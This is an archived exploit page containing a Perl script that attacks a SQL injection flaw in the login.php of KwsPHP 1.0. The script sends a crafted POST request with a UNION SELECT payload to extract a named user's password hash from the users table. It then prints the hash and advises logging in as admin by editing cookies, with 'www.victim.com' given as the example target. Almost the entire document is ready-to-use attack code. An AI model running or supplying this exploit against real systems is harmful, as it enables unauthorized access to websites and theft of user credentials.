<html><head><title>KwsPHP 1.0 (login.php) Remote SQL Injection Exploit</title></head><pre>###################################################
#  Script..........................: KwsPHP  ver 1.0 
#  Script Site..................: http://kws.koogar.org/
#  Vulnerability...............: login.php Remote SQL injection Exploit
#  Access.........................: Remote
#  level.............................: Dangerous
#  Author..........................: S4mi
#  Contact.........................: S4mi[at]LinuxMail.org
####################################################
#Special Greetz to : Simo64, DrackaNz, Coder212, Iss4m, HarDose, E.chark, r0_0t, ddx39 
#
####################################################
# This Exploit  work Only When magic_quotes_gpc Is OFF
#
#Usage  :       C:\Xploit.pl  127.0.0.1  /KswPHP/ admin
#Result Screen Shot :
#+**********************+
# Connecting ...[OK]
# Sending Data ...[OK]
#
#  + Exploit succeed! Getting admin information.
# + ---------------- +
# + Username: admin
# + Password: e10adc3949ba59abbe56e057f20f883e
###################################################

#!/usr/bin/perl

use IO::Socket ;

&amp;header();

&amp;usage unless(defined($ARGV[0] &amp;&amp; $ARGV[1] &amp;&amp; $ARGV[2]));

$host = $ARGV[0];
$path = $ARGV[1];
$user = $ARGV[2];


syswrite STDOUT ,&quot;\n Connecting ...&quot;;

my $sock = new IO::Socket::INET ( PeerAddr =&gt; &quot;$host&quot;,PeerPort =&gt; &quot;80&quot;,Proto =&gt; &quot;tcp&quot;,);
								
die &quot;\n Unable to connect to $host\n&quot; unless($sock);

syswrite STDOUT, &quot;[OK]&quot;;

$inject = &quot;union%20all%20select%200,pass,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20users%20where%20pseudo='$user'/*&amp;pass=ZAZ&amp;verifer=Se%20Loguer&quot;;	

syswrite STDOUT ,&quot;\n Sending Data ...&quot;;

print $sock &quot;POST $path/login.php?pseudo=%22$inject HTTP/1.1\n&quot;;
print $sock &quot;Host: $host\n&quot;;
print $sock &quot;Referer: $host\n&quot;;
print $sock &quot;Accept-Language: en-us\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $sock &quot;User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\n&quot;;
print $sock &quot;Cache-Control: no-cache\n&quot;;
print $sock &quot;Connection: Close\n\n&quot;;

syswrite STDOUT ,&quot;[OK]\n\n&quot;;

while($answer = &lt;$sock&gt;){

if ($answer =~ /class=&quot;messagelogin&quot;&gt;(.*?) /){
print &quot;+ Exploit succeed! Getting admin information.\n&quot;;
print &quot;+ ----------------------- +\n&quot;;
print &quot;+ Username: $user\n&quot;;
print &quot;+ Password: $1\n&quot;;
print &quot;+ -------Have Fun--------- +\n&quot;;
print &quot;+ You don't need to crack the hash password :D\n&quot;;
print &quot;+ Just login with ur owen information and edit the cookies\n&quot;;
}
}

sub usage{
	print &quot;\nUsage   : perl $0 host /path/ UserName &quot;;
	print &quot;\nExemple : perl $0 www.victim.com /KwsPHP/ admin\n&quot;;
	exit(0);
}
sub header(){
print q(
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#  Script......................: KwsPHP  ver 1.0
#  Script Site.................: http://kws.koogar.org/
#  Vulnerability...............: Remote SQL injection Exploit
#  Access......................: Remote
#  level.......................: Dangerous
#  Author......................: S4mi
#  Contact.....................: S4mi[at]LinuxMail.org
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
);
}

# milw0rm.com [2007-09-15]</pre></html>